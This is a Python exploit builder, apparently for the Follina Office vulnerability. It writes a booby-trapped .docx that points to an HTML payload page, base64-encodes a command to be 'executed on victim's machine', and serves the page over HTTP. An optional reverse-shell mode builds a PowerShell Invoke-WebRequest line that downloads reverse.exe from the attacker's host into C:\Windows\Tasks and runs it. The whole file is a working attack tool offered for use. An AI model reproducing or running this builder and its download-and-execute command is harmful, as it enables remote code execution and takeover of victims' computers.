#!/bin/python3
import argparse
import os
import zipfile
import http.server
import socketserver
import base64
from urllib.parse import urlparse

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file),
                       os.path.relpath(
                            os.path.join(root, file),
                            path
                       ))

def generate_docx(payload_url, docx_name):

    with open("src/docx.template", "r") as f:
        template = f.read()

    rels = template.format(payload_url = payload_url) 

    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
        f.write(rels)

    with zipfile.ZipFile(f"output/{docx_name}", "w", zipfile.ZIP_DEFLATED) as zipf:
        zipdir("src/docx", zipf)

    print(f"Generated {docx_name}")

def generate_html(command):

    with open("src/html.template", "r") as f:
        template = f.read()

    payload = template.format(payload_command = command)

    with open("src/html/index.html", "w") as f:
        f.write(payload)

    print("Generated html payload")
    
def __main__():

    parser = argparse.ArgumentParser()
    required = parser.add_argument_group("Required Arguments")
    optional = parser.add_argument_group("Optional")
    
    required.add_argument('-u', '--url', action="store", dest="host",
        help = "Host ip for the http server"
    )

    required.add_argument('-c', '--command', action="store", dest="command",
        help = "Command to be executed on victim's machine"
    )

    optional.add_argument("-p", "--port", action="store", dest="port", default=8080,
        help = "Port for the http server"
    )

    optional.add_argument("-o", "--output", action="store", dest="output", default="follina.docx",
        help = "Docx output file"
    )

    optional.add_argument("-r", "--reverse", action="store", dest="reverse", 
        help = "Reverse shell binary"
    )


    args = parser.parse_args()

    reverse = False
    command = args.command

    if not args.host:
        raise SystemExit("Please provide a host for html payload: -u")

    if not args.command and not args.reverse:
        raise SystemExit("Please provide a command to be executed: -c")

    if args.reverse:

        reverse = True
        command = f"""Invoke-WebRequest http://{args.host}:{args.port}/reverse.exe -OutFile C:\\Windows\\Tasks\\reverse.exe; C:\\Windows\\Tasks\\reverse.exe"""

        try:
            os.rename(f"./{args.reverse}", "./src/html/reverse.exe")

        except:
            raise SystemExit(f"Can't find the following file: {args.file}")

    payload_url = f"http://{args.host}:{args.port}/index.html"

    generate_docx(payload_url, args.output)

    parsed_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('utf-8')

    generate_html(parsed_command)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="src/html",**kwargs)

    print(f"Serving html payload on: {args.host}")
    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    __main__()
